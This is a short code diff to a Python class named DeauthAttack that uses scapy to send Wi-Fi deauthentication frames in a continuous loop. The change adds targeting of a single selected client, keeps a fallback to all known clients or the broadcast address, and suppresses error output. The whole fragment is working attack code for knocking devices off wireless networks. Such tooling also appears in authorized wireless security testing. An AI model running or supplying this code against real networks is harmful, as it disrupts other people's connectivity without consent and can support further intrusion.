@@ -23,13 +23,21 @@ class DeauthAttack:
     
     def start_deauth(self):
         while not self._stop_event.is_set():
-            targets = globals.clients if globals.clients else ["ff:ff:ff:ff:ff:ff"]
-            for client in targets:
+            if globals.selected_client:
                 try:
-                    if self._stop_event.is_set():
-                        return
-                    pkt = self.build_deauth_packet(client)
+                    pkt = self.build_deauth_packet(globals.selected_client)
                     scapy.sendp(pkt, iface=self.IFACE, verbose=False)
                     time.sleep(0.1)
                 except Exception as e:
-                    print("Error in deauth class:", e)
+                    time.sleep(0.1)
+            else:
+                targets = globals.clients if globals.clients else ["ff:ff:ff:ff:ff:ff"]
+                for client in targets:
+                    try:
+                        if self._stop_event.is_set():
+                            return
+                        pkt = self.build_deauth_packet(client)
+                        scapy.sendp(pkt, iface=self.IFACE, verbose=False)
+                        time.sleep(0.1)
+                    except Exception as e:
+                        time.sleep(0.1)
